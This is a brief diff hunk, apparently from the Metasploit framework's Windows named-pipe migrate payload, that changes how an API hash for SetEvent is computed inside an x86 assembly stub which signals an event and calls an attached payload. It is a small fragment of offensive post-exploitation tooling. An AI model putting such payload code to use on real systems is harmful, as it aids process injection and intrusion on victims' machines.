@@ -32,7 +32,7 @@ module Payload::Windows::MigrateNamedPipe
       mov edi, [esi+16]         ; The duplicated pipe handle is in the migrate context.
     signal_pipe_event:
       push dword [esi]          ; Event handle is pointed at by esi
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
+      push #{block_api_hash('kernel32.dll', 'SetEvent')}
       call ebp                  ; SetEvent(handle)
     call_pipe_payload:
       call dword [esi+8]        ; call the associated payload
